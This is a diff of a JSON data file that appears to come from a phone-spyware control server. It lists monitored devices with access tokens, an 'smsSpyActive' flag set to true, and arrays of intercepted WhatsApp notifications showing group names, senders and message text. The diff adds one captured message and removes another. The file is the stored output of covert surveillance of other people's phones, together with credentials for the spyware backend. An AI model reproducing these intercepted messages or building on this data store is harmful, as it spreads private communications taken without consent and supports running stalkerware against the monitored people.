@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775042485998,
+    "lastSeen": 1775042501008,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12533 pesan): ~ Bot",
+        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : aku sebenernya anak ariana grande, tante ku olivia rodrigo\n╰─╼𔕬─┈───┈───┈",
+        "time": "01/04 19:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042501190
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12532 pesan): ~ 趙雨凡🌼",
@@ -4011,14 +4019,6 @@
         "time": "01/04 19:09",
         "pkg": "com.whatsapp",
         "receivedAt": 1775041741787
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [6] (96 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
-        "content": "22 3 nvmtps fpt n mcro mobi andro only",
-        "time": "01/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041741748
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775042487018,
+    "lastSeen": 1775042498925,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
